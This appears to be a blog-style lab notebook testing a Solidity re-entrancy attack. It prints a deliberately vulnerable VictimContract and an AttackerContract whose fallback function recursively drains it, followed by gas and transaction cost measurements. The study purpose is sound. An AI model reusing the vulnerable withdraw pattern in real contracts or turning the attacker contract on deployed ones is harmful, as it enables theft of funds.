# Solidity Analysis

## Introduction
We are testing re-entrancy attack with the following code:

```vim
pragma solidity >=0.4.0 <0.6.0;

contract VictimContractInterface {
    function withdraw() public payable;
}

contract VictimContract {
    uint256 toTransfer = 1 ether;

    function withdraw() public payable {
        msg.sender.call.value(toTransfer)("");
        toTransfer = 0;
    }
    
    function deposit() public payable {}
}

contract AttackerContract {
    address victim;
    
    constructor(address _victim) public {
        victim = _victim;
    }
    
    function attack() public {
        VictimContractInterface(victim).withdraw();
    }
    
    function () external payable {
        attack();
    }
    
    function getAttackerBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    function getVictimBalance() public view returns (uint) {
        return address(victim).balance;
    }
}
```
### Action 0: Check the initial state

| Address |     1    |
| ------------- | ------- |
| Balance       | 100 ether |
| Gas limit     | 3000000        |
| Transaction cost |  - |
| Execution cost   | -  |
 
### Action 1: Deploy the contract **VictimContract**

#### Test 1 (default)

| Address          | 1(deploying VictimContract)        | VictimContract |
| ---------------- | ---------------------------------- | -------------- |
| Balance          | 100 ether -> 99.999999999999861319 |             0   |
| Gas limit        | 3000000                            |    -            |
| Transaction cost | 138681                             |    -            |
| Execution cost   | 69105                              |      -          |

![test1](/images/2019/01/Screen Shot 2019-01-13 at 2.49.58 AM.png)

The amount of transaction cost was deducted from the initial balance of the address 1.

**Transaction costs** are the costs for sending the contract code to the ethereum blockchain, they depend on the size of the contract.

**Execution costs** should be really the EVM execution costs, if I interprete the parameter `vmResult` correctly. 

[Transaction cost vs Execution cost](https://ethereum.stackexchange.com/questions/5812/what-is-the-difference-between-transaction-cost-and-execution-cost-in-browser-so)

#### Test 2 
Change the gas limit into 100000 which is less than the anount of the transaction cost in Test 1.

